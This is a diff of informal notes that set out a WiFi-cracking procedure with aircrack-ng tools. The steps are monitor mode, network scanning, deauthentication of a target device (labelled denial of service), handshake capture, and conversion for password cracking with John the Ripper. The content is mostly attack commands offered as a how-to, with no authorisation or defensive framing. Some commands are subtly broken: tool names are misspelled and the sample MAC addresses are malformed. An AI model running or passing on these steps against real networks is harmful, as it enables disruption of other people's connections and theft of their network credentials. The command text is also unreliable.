@@ -43,22 +43,32 @@ links : https://www.youtube.com/watch?v=X5rpwcb6EuQ
 
 adaptor switching
 start - airmon-ng start "adaptername or ex:wlan0"
-stop - airmon stop "adaptername or ex:wlan0"
+stop - airmon-ng stop "adaptername or ex:wlan0"
 
 dump all bssid 
 
-airdump "adaptername in monitor mode or ex:wlan0mon" or target spwcific ssid
-airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --channel "channel# example: 18"
+(airdump "adaptername in monitor mode or ex:wlan0mon")  or "mac address"  // (airdump wlan0mon) or add  -->   20:2c:29:00:11
+(airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --channel "channel# example: 18") // airdump wlan0mon --bssid 20:2c:29:00:11 --channel 18
 //performing deauth first, look for most active device on the chosen wifi network
 >>denial of service
+
 open new terminal
+
         airplay-ng -0 10 -a "router macaddress" -c "target device mac address" "adapter name in monitor mode ex: wlan0mon"
+        
+  -0 denotes denial of service 
   10 will be the amount of packets or the delay time that the user will be kicked out from the network
   -a is used to specify the access point mac address
   -c is used to specify target mac address
-   
+  
+  
+open new terminal
  >>capture handshake
 airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --channel "channel# example: 18" -w "filenamelocation/filename"
+
+sample: airdump wlan0mon --bssid 20:c2:20:21:1a --channel 11 -w Desktop/filename
+
+
 
 /////////////modify .cap or capture handshake
 
@@ -71,5 +81,7 @@ steps.
 -open terminal
 -type "aircrack-ng Filelocation/file.cap -J newfilelocation/newfilename" without double quote
 -type "hccap2john Filelocation/file.hccap > newfilelocation/newfilename.txt" without double quote
+open .txt in john
+
 
 thats it
